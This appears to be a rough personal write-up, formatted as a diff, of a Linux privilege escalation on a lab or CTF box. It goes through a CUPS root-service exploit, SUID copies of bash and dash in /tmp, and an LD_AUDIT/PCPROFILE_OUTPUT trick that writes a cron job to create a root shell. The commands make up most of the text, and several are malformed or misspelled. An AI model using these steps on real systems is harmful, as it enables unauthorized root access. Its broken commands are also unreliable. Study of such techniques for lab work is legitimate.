@@ -1,0 +1,41 @@
+Enum 
+there is service running as root called CUPS;
+the rce exploit: 
+
+https://www.exploit-db.com/exploits/41233
+
+
+put a bash binary in tmp folder and attempt to change SUID bit and then run the -p flag though the rce:
+cp  /bin/bash /tmp/exploit;chmod+s /tmp/exploit /tmp/exploit -p 
+
+
+The exploit required a .so file
+Here is the reference:
+
+https://cheatsheet.haax.fr/linux-systems/privilege-escalation/crontab/#writable-cron-directory
+
+# In /tmp 
+# LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/exploit" ping
+# since it won't find the .so, the file from PCPROFILE_OUTPUT will be written as word writeable
+# Then insert payload inside to create suid root program in /tmp
+printf “***** root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exmploit\n” > /etc/cron.d/exploit
+cat /etc/cron.d/exploit
+ll
+./exploit
+whoami
+
+.......................................................................
+
+
+This is an alternative way if we dont hAve .so file as per exploit requirements
+
+https://blog.gdssecurity.com/labs/2018/7/11/cups-local-privilege-escalation-and-sandbox-escapes.html
+
+
+and the your are root#
+“””””””””””””””””””””””
+
+Note:
+
+I got this way for the requirement of this exploit we need to perform the bash suid thing first.
+
